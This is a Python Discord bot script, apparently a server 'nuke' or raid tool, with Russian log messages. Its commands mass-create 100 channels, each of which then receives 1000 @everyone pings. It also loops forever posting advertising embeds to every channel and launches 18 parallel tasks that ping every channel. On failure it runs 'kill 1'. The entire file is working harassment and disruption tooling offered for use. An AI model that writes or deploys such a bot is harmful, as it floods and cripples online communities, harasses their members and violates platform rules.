import discord
import time
import random
import asyncio
import os
import json
import inspect
import aiohttp
import datetime
import threading
from discord import Permissions
from discord import client
from discord.ext import commands
from discord.utils import get
from threading import Thread
from time import sleep
import discord, random, aiohttp, asyncio

token = os.environ['Token']
intents = discord.Intents.all()
client = commands.Bot(command_prefix = '+', intents=intents)
client.remove_command('help')
@client.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {client.user}  ')

@client.command()
@commands.cooldown(1, 500, commands.BucketType.guild)
async def schannel(ctx):
  await ctx.message.delete()
  for c in range(100):
      try:
        await ctx.guild.create_text_channel(f"yrhenjxrf{c}")
        print("создал канал")
      except:
        print("не создал канал")
        continue

  else:
    pass 
    
@client.event
async def on_guild_channel_create(ch):
 for i in range(1000):await ch.send('@everyone')

async def spallch(ctx):
  msg = '@everyone'
  for channel in ctx.guild.text_channels:
    try:
      await channel.send(msg)
    except:
      pass


@client.command()
@commands.cooldown(1, 350, commands.BucketType.guild)
async def ml(ctx):
  await ctx.message.delete()
  while True:
      try:
        for channel in ctx.guild.text_channels:
          embed = discord.Embed(
            title="___почему ты должен прийти к нам?___",
            description=
            "ssssssssssssuuuuuuuuuuu",
            color=0xFF0100)
          embed.set_image(
            url=
            "https://images-ext-2.discordapp.net/external/1zteMORy3fWG3lDoG--2Qew4TITYQUdDaFw1AjKIrKo/%3Fwidth%3D760%26height%3D427/https/images-ext-2.discordapp.net/external/3iucRLpfFa37w_FlVfgzHLuiveohukWOTmhWG1h3Xr8/https/share.creavite.co/c225JjyWBZpywY9x.png?width=684&height=384"
          )
          await channel.send(
            "@everyone @here ",
            embed=embed)
      except Exception as e:
        print(e)
  else:
    pass
    
@client.command()
@commands.cooldown(1, 350, commands.BucketType.guild)
async def everyone(ctx):
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))
    asyncio.create_task(spallch(ctx))

try:
    client.run(token)
except Exception as e:
    print(e) 
    os.system("kill 1")
